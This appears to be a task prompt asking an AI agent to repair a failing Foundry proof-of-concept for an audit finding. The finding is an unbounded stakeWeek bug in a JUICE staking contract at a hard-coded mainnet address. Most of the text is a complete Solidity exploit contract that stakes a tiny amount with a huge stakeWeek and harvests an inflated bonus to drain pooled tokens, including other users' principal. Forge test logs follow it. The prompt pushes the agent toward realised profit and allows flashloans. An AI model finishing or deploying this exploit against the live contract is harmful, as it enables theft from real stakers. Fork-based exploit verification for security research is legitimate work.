You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: direct_or_existing_balance_first
- strategy_instructions: Prefer direct execution using verifier-held assets first. Only use temporary external funding if direct path is infeasible.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Unbounded `stakeWeek` lets a staker mint an arbitrarily large bonus and drain the pool
- claim: `stake()` accepts any positive `stakeWeek`, and both `harvest()` and `unstake()` pay a bonus of `pending * (stakingWeek - 1) * 9 / 100`. Because there is no upper bound or normalization on `stakingWeek`, an attacker can choose an extreme value and turn even a small amount of accrued base reward into an arbitrarily large claim on the contract's shared token balance.
- impact: A permissionless staker can drain not only funded rewards but also other users' deposited principal held by the contract. Once enough balance is extracted, later harvests and unstakes revert, causing theft and permanent lockup for honest users.
- exploit_paths: ["Attacker calls `stake(tinyAmount, hugeStakeWeek)` while staking is open.", "After any nonzero base reward accrues, the attacker calls `harvest(stakeCount)` or waits to call `unstake(stakeCount)`.", "The computed `bonus` becomes enormous and is transferred from the contract's pooled JUICE balance, depleting rewards and potentially user principal."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Minimal {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IJuiceStaking {
    function Juice() external view returns (address);
    function JuiceStaked() external view returns (uint256);
    function rewardPerSecond() external view returns (uint256);
    function stake(uint256 amount, uint256 stakeWeek) external;
    function harvest(uint256 stakeCount) external;
    function unstake(uint256 stakeCount) external;
    function pendingReward(address staker, uint256 stakeCount) external view returns (uint256 pending, uint256 bonus);
    function stakingStartTime() external view returns (uint256);
    function stakingEndTime() external view returns (uint256);
    function stakingCount(address staker) external view returns (uint256);
    function mapStakingInfo(address staker, uint256 stakeCount)
        external
        view
        returns (
            uint256 stakedAmount,
            uint256 startTime,
            uint256 endTime,
            uint256 stakingWeek,
            uint256 rewardDebt,
            uint256 unstakeStatus
        );
}

contract FlawVerifier {
    IJuiceStaking internal constant STAKING = IJuiceStaking(0x8584DdbD1E28bCA4bc6Fb96baFe39f850301940e);
    address internal constant JUICE = 0xdE5d2530A877871F6f0fc240b9fCE117246DaDae;

    uint256 internal constant TARGET_PENDING_HORIZON = 1 days;
    uint256 internal constant PAYOUT_SAFETY_DIVISOR = 100;
    uint256 internal constant MAX_REASONABLE_HUGE_STAKE_WEEK = 1e30;

    uint256 internal baselineBalance;
    uint256 internal trackedStakeCount;
    uint256 internal trackedStakeEndTime;
    bool internal baselineSet;
    bool internal stakeOpened;

    error StakingNotStarted(uint256 stakingStartTime);
    error StakingClosed(uint256 stakingEndTime, uint256 currentTime);
    error NoVerifierHeldJuice();
    error RewardEmissionInactive();
    error StakeAlreadyExited();
    error RewardNotAccruedYet(uint256 pending, uint256 bonus);

    constructor() {}

    function executeOnOpportunity() public {
        if (!stakeOpened) {
            _openExploitPosition();
            return;
        }

        _realizeExploitProfit();
    }

    function profitToken() external pure returns (address) {
        return JUICE;
    }

    function profitAmount() external view returns (uint256) {
        if (!baselineSet) {
            return 0;
        }

        uint256 currentBalance = IERC20Minimal(JUICE).balanceOf(address(this));
        if (currentBalance <= baselineBalance) {
            return 0;
        }

        return currentBalance - baselineBalance;
    }

    function _openExploitPosition() internal {
        uint256 stakingStart = STAKING.stakingStartTime();
        if (stakingStart == 0) {
            revert StakingNotStarted(stakingStart);
        }

        uint256 stakingEnd = STAKING.stakingEndTime();
        if (stakingEnd <= block.timestamp) {
            revert StakingClosed(stakingEnd, block.timestamp);
        }

        IERC20Minimal juice = IERC20Minimal(JUICE);
        uint256 verifierHeldJuice = juice.balanceOf(address(this));
        if (verifierHeldJuice == 0) {
            // Attempt strategy is direct_or_existing_balance_first.
            // This verifier therefore uses only JUICE already held by the verifier unless
            // the harness supplies funding through realistic public on-chain actions.
            revert NoVerifierHeldJuice();
        }

        uint256 currentTotalStaked = STAKING.JuiceStaked();
        uint256 rewardRate = STAKING.rewardPerSecond();
        if (rewardRate == 0) {
            revert RewardEmissionInactive();
        }

        uint256 tinyAmount = _chooseTinyAmount(verifierHeldJuice, currentTotalStaked, rewardRate);
        uint256 hugeStakeWeek = _chooseHugeStakeWeek(
            tinyAmount,
            currentTotalStaked,
            rewardRate,
            juice.balanceOf(address(STAKING))
        );

        baselineBalance = verifierHeldJuice;
        baselineSet = true;

        trackedStakeCount = STAKING.stakingCount(address(this));

        require(juice.approve(address(STAKING), tinyAmount), "approve failed");

        // Exploit path step 1:
        // attacker calls stake(tinyAmount, hugeStakeWeek) while staking is open.
        STAKING.stake(tinyAmount, hugeStakeWeek);

        (, , trackedStakeEndTime, , , ) = STAKING.mapStakingInfo(address(this), trackedStakeCount);
        stakeOpened = true;
    }

    function _realizeExploitProfit() internal {
        uint256 stakeCount = trackedStakeCount;

        (
            uint256 stakedAmount,
            ,
            uint256 endTime,
            ,
            ,
            uint256 unstakeStatus
        ) = STAKING.mapStakingInfo(address(this), stakeCount);

        if (stakedAmount == 0 || unstakeStatus != 0) {
            revert StakeAlreadyExited();
        }

        (uint256 pending, uint256 bonus) = STAKING.pendingReward(address(this), stakeCount);
        if (pending == 0) {
            // Exploit path step 2 requires a nonzero base reward to accrue first.
            revert RewardNotAccruedYet(pending, bonus);
        }

        // Exploit path step 3:
        // realize the inflated bonus through harvest(stakeCount) or unstake(stakeCount),
        // preserving the same exploit causality as the finding.
        if (block.timestamp >= endTime || block.timestamp >= trackedStakeEndTime) {
            STAKING.unstake(stakeCount);
        } else {
            STAKING.harvest(stakeCount);
        }
    }

    function _chooseTinyAmount(
        uint256 verifierHeldJuice,
        uint256 currentTotalStaked,
        uint256 rewardRate
    ) internal pure returns (uint256 tinyAmount) {
        if (currentTotalStaked == 0) {
            return verifierHeldJuice >= 1 ? 1 : verifierHeldJuice;
        }

        uint256 divisor = rewardRate * TARGET_PENDING_HORIZON;
        if (divisor == 0) {
            return verifierHeldJuice;
        }

        tinyAmount = currentTotalStaked / divisor;
        if (currentTotalStaked % divisor != 0) {
            tinyAmount += 1;
        }

        if (tinyAmount == 0) {
            tinyAmount = 1;
        }

        if (tinyAmount > verifierHeldJuice) {
            tinyAmount = verifierHeldJuice;
        }
    }

    function _chooseHugeStakeWeek(
        uint256 tinyAmount,
        uint256 currentTotalStaked,
        uint256 rewardRate,
        uint256 poolBalance
    ) internal pure returns (uint256 hugeStakeWeek) {
        uint256 expectedPending = rewardRate * TARGET_PENDING_HORIZON;
        expectedPending = (expectedPending * tinyAmount) / (currentTotalStaked + tinyAmount);
        if (expectedPending == 0) {
            expectedPending = 1;
        }

        uint256 desiredPayout = poolBalance / PAYOUT_SAFETY_DIVISOR;
        if (desiredPayout <= expectedPending) {
            return 2;
        }

        uint256 bonusTarget = desiredPayout - expectedPending;
        hugeStakeWeek = ((bonusTarget * 100) / (expectedPending * 9)) + 1;

        if (hugeStakeWeek < 2) {
            hugeStakeWeek = 2;
        }

        if (hugeStakeWeek > MAX_REASONABLE_HUGE_STAKE_WEEK) {
            hugeStakeWeek = MAX_REASONABLE_HUGE_STAKE_WEEK;
        }
    }
}

```

forge stdout (tail):
```
Compiling 2 files with Solc 0.8.30
Solc 0.8.30 finished in 1.16s
Compiler run successful with warnings:
Warning (2072): Unused local variable.
  --> test/ExploitPOC.t.sol:78:19:
   |
78 |         (bool ok, bytes memory ret) = address(verifier).call(abi.encodeWithSignature("executeOnOpportunity()"));
   |                   ^^^^^^^^^^^^^^^^


Ran 1 test for test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: exploit call reverted] testExploit() (gas: 24385)
Traces:
  [24385] FlawVerifierTest::testExploit()
    ├─ [167] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0xdE5d2530A877871F6f0fc240b9fCE117246DaDae
    ├─ [2897] 0xdE5d2530A877871F6f0fc240b9fCE117246DaDae::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   └─ ← [Return] 0
    ├─ [11601] FlawVerifier::executeOnOpportunity()
    │   ├─ [2350] 0x8584DdbD1E28bCA4bc6Fb96baFe39f850301940e::stakingStartTime() [staticcall]
    │   │   └─ ← [Return] 1709926847 [1.709e9]
    │   ├─ [2328] 0x8584DdbD1E28bCA4bc6Fb96baFe39f850301940e::stakingEndTime() [staticcall]
    │   │   └─ ← [Return] 1717702847 [1.717e9]
    │   ├─ [897] 0xdE5d2530A877871F6f0fc240b9fCE117246DaDae::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   └─ ← [Revert] NoVerifierHeldJuice()
    └─ ← [Revert] exploit call reverted

Backtrace:
  at FlawVerifier.executeOnOpportunity
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 1.97s (1.24ms CPU time)

Ran 1 test suite in 2.01s (1.97s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: exploit call reverted] testExploit() (gas: 24385)

Encountered a total of 1 failing tests, 0 tests succeeded

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
